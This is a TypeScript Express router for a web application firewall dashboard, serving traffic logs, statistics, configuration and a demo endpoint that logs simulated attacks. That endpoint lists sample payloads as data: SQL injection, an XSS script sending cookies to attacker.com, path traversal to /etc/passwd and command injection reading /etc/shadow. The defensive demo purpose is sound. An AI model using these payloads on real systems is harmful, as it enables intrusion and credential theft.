import express, { Request, Response } from 'express';
import TrafficLogModel from '../model/trafficLog.model';
import { getWafConfig, setWafConfig } from '../middleware/wafMiddleware';
import { getSocketIO, emitLiveTrafficUpdate } from '../socket/serviceSocket';

const wafRouter = express.Router();

/**
 * GET /api/waf/logs
 * Returns paginated traffic logs with filtering support
 */
wafRouter.get('/logs', async (req: Request, res: Response) => {
  try {
    const page = Math.max(1, parseInt(req.query.page as string) || 1);
    const limit = Math.min(100, Math.max(1, parseInt(req.query.limit as string) || 25));
    const threatType = req.query.threatType as string;
    const action = req.query.action as string;
    const search = req.query.search as string;

    const filter: any = {};

    if (threatType && threatType !== 'all') {
      filter.threatType = threatType;
    }
    if (action && action !== 'all') {
      filter.action = action;
    }
    if (search) {
      filter.$or = [
        { endpoint: { $regex: search, $options: 'i' } },
        { ipAddress: { $regex: search, $options: 'i' } },
        { country: { $regex: search, $options: 'i' } },
        { payload: { $regex: search, $options: 'i' } },
      ];
    }

    const total = await TrafficLogModel.countDocuments(filter);
    const logs = await TrafficLogModel.find(filter)
      .sort({ timestamp: -1 })
      .skip((page - 1) * limit)
      .limit(limit)
      .lean();

    return res.status(200).json({
      success: true,
      data: logs,
      pagination: {
        page,
        limit,
        total,
        totalPages: Math.ceil(total / limit) || 1,
      },
    });
  } catch (err: any) {
    console.error('[WAF ROUTES] Error fetching logs:', err);
    return res.status(500).json({ error: 'Failed to retrieve traffic logs.' });
  }
});

/**
 * GET /api/waf/stats
 * Aggregates analytical metrics for the live dashboard (24h timeline, country counts, top endpoints)
 */
wafRouter.get('/stats', async (_req: Request, res: Response) => {
  try {
    const now = new Date();
    const twentyFourHoursAgo = new Date(now.getTime() - 24 * 60 * 60 * 1000);
    const startOfToday = new Date(now.getFullYear(), now.getMonth(), now.getDate());

    // 1. Basic Counts
    const [totalRequests, blockedThreats, requestsToday, threatsToday] = await Promise.all([
      TrafficLogModel.countDocuments(),
      TrafficLogModel.countDocuments({ action: 'Blocked' }),
      TrafficLogModel.countDocuments({ timestamp: { $gte: startOfToday } }),
      TrafficLogModel.countDocuments({ action: 'Blocked', timestamp: { $gte: startOfToday } }),
    ]);

    // 2. Active Socket Connections Count
    const io = getSocketIO();
    const activeConnections = io ? io.engine?.clientsCount || 1 : 1;

    // 3. Breakdown by Threat Category
    const threatsByTypeRaw = await TrafficLogModel.aggregate([
      { $match: { threatType: { $ne: 'None' } } },
      { $group: { _id: '$threatType', count: { $sum: 1 } } },
    ]);

    const threatsByType: Record<string, number> = {
      SQLi: 0,
      XSS: 0,
      'Path Traversal': 0,
      'Command Injection': 0,
    };
    threatsByTypeRaw.forEach((item) => {
      threatsByType[item._id] = item.count;
    });

    // 4. Top Targeted Endpoints
    const topEndpoints = await TrafficLogModel.aggregate([
      { $match: { threatType: { $ne: 'None' } } },
      { $group: { _id: '$endpoint', count: { $sum: 1 }, lastThreat: { $last: '$threatType' } } },
      { $sort: { count: -1 } },
      { $limit: 5 },
      { $project: { endpoint: '$_id', count: 1, lastThreat: 1, _id: 0 } },
    ]);

    // 5. Top Threat Origin Countries
    const topCountries = await TrafficLogModel.aggregate([
      { $match: { action: 'Blocked' } },
      { $group: { _id: { country: '$country', code: '$countryCode' }, count: { $sum: 1 } } },
      { $sort: { count: -1 } },
      { $limit: 6 },
      {
        $project: {
          country: '$_id.country',
          code: '$_id.code',
          count: 1,
          _id: 0,
        },
      },
    ]);

    // 6. 24-Hour Timeline Data (Hourly Buckets for Recharts AreaChart)
    const timelineRaw = await TrafficLogModel.aggregate([
      { $match: { timestamp: { $gte: twentyFourHoursAgo } } },
      {
        $group: {
          _id: {
            year: { $year: '$timestamp' },
            month: { $month: '$timestamp' },
            day: { $dayOfMonth: '$timestamp' },
            hour: { $hour: '$timestamp' },
          },
          total: { $sum: 1 },
          blocked: {
            $sum: { $cond: [{ $eq: ['$action', 'Blocked'] }, 1, 0] },
          },
        },
      },
      { $sort: { '_id.year': 1, '_id.month': 1, '_id.day': 1, '_id.hour': 1 } },
    ]);

    // Generate complete 24 hourly points so the chart doesn't have blank gaps
    const timeline: Array<{ time: string; total: number; blocked: number }> = [];
    for (let i = 23; i >= 0; i--) {
      const bucketDate = new Date(now.getTime() - i * 60 * 60 * 1000);
      const hourLabel = bucketDate.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: false });
      const bHour = bucketDate.getHours();
      const bDay = bucketDate.getDate();

      const found = timelineRaw.find((item) => item._id.hour === bHour && item._id.day === bDay);
      timeline.push({
        time: hourLabel,
        total: found ? found.total : 0,
        blocked: found ? found.blocked : 0,
      });
    }

    return res.status(200).json({
      success: true,
      stats: {
        totalRequests,
        blockedThreats,
        requestsToday,
        threatsToday,
        activeConnections,
        threatsByType,
        topEndpoints,
        topCountries,
        timeline,
      },
    });
  } catch (err: any) {
    console.error('[WAF ROUTES] Error aggregating stats:', err);
    return res.status(500).json({ error: 'Failed to aggregate traffic statistics.' });
  }
});

/**
 * GET /api/waf/config
 * Returns active WAF operational settings
 */
wafRouter.get('/config', (_req: Request, res: Response) => {
  return res.status(200).json({
    success: true,
    config: getWafConfig(),
  });
});

/**
 * POST /api/waf/config
 * Updates WAF operational mode ('active' vs 'simulation') and rule switches
 */
wafRouter.post('/config', async (req: Request, res: Response) => {
  try {
    const updated = await setWafConfig(req.body);
    return res.status(200).json({
      success: true,
      message: `WAF configuration updated successfully. Mode: ${updated.mode.toUpperCase()}`,
      config: updated,
    });
  } catch (err: any) {
    console.error('[WAF ROUTES] Error updating config:', err);
    return res.status(500).json({ error: 'Failed to update WAF configuration.' });
  }
});

/**
 * POST /api/waf/simulate
 * Injects synthetic real-world traffic attacks for instant demonstration and testing
 */
wafRouter.post('/simulate', async (req: Request, res: Response) => {
  try {
    const { attackType = 'random' } = req.body;

    const SAMPLE_ATTACKS = [
      {
        threatType: 'SQLi' as const,
        endpoint: '/api/auth/login?username=admin%27%20OR%201=1--',
        payload: "' OR 1=1 --",
        method: 'POST',
        country: 'United States',
        countryCode: 'US',
        city: 'Ashburn',
        ruleMatched: "Tautology Condition (' OR 1=1)",
      },
      {
        threatType: 'SQLi' as const,
        endpoint: '/api/services?filter=1%20UNION%20SELECT%20password%20FROM%20users',
        payload: 'UNION SELECT password FROM users',
        method: 'GET',
        country: 'Russian Federation',
        countryCode: 'RU',
        city: 'Moscow',
        ruleMatched: 'UNION SELECT Exfiltration',
      },
      {
        threatType: 'XSS' as const,
        endpoint: '/api/profile?comment=<script>fetch("http://attacker.com/steal?"+document.cookie)</script>',
        payload: '<script>fetch("http://attacker.com/steal?"+document.cookie)</script>',
        method: 'POST',
        country: 'China',
        countryCode: 'CN',
        city: 'Shenzhen',
        ruleMatched: 'Script Tag Injection (<script>)',
      },
      {
        threatType: 'XSS' as const,
        endpoint: '/api/search?q=<img%20src=x%20onerror=alert(document.domain)>',
        payload: '<img src=x onerror=alert(document.domain)>',
        method: 'GET',
        country: 'Germany',
        countryCode: 'DE',
        city: 'Frankfurt',
        ruleMatched: 'Inline Event Handler (onload=, onerror=, etc.)',
      },
      {
        threatType: 'Path Traversal' as const,
        endpoint: '/api/files/download?file=../../../../etc/passwd',
        payload: '../../../../etc/passwd',
        method: 'GET',
        country: 'Brazil',
        countryCode: 'BR',
        city: 'São Paulo',
        ruleMatched: 'Directory Traversal Relative Path (../)',
      },
      {
        threatType: 'Command Injection' as const,
        endpoint: '/api/ping?host=127.0.0.1;%20cat%20/etc/shadow',
        payload: '; cat /etc/shadow',
        method: 'POST',
        country: 'Netherlands',
        countryCode: 'NL',
        city: 'Amsterdam',
        ruleMatched: 'Shell Chaining Operator (; cat, | bash, && whoami)',
      },
      {
        threatType: 'None' as const,
        endpoint: '/api/dashboard/stats',
        payload: '',
        method: 'GET',
        country: 'India',
        countryCode: 'IN',
        city: 'Bengaluru',
        ruleMatched: '',
      },
    ];

    let attack = SAMPLE_ATTACKS.find((a) => a.threatType.toLowerCase() === attackType.toLowerCase());
    if (!attack) {
      attack = SAMPLE_ATTACKS[Math.floor(Math.random() * SAMPLE_ATTACKS.length)];
    }

    const currentConfig = getWafConfig();
    const isThreat = attack.threatType !== 'None';
    const action = isThreat && currentConfig.mode === 'active' ? ('Blocked' as const) : ('Allowed' as const);

    const logEntry = await TrafficLogModel.create({
      ipAddress: `${Math.floor(Math.random() * 200 + 20)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
      method: attack.method,
      endpoint: attack.endpoint,
      payload: attack.payload,
      threatType: attack.threatType,
      action,
      statusCode: action === 'Blocked' ? 403 : 200,
      country: attack.country,
      countryCode: attack.countryCode,
      city: attack.city,
      userAgent: 'Mozilla/5.0 (Kali Linux x86_64; Security Penetration Tester)',
      ruleMatched: attack.ruleMatched,
      timestamp: new Date(),
    });

    emitLiveTrafficUpdate(logEntry.toObject());

    return res.status(200).json({
      success: true,
      message: `Simulated attack ${attack.threatType} triggered. Action: ${action}`,
      log: logEntry,
    });
  } catch (err: any) {
    console.error('[WAF ROUTES] Error simulating attack:', err);
    return res.status(500).json({ error: 'Failed to simulate test attack.' });
  }
});

/**
 * DELETE /api/waf/logs
 * Clears traffic logs history (Admin utility)
 */
wafRouter.delete('/logs', async (_req: Request, res: Response) => {
  try {
    const result = await TrafficLogModel.deleteMany({});
    return res.status(200).json({
      success: true,
      message: `Cleared ${result.deletedCount} traffic log records.`,
    });
  } catch (err: any) {
    console.error('[WAF ROUTES] Error clearing logs:', err);
    return res.status(500).json({ error: 'Failed to clear traffic logs.' });
  }
});

export default wafRouter;
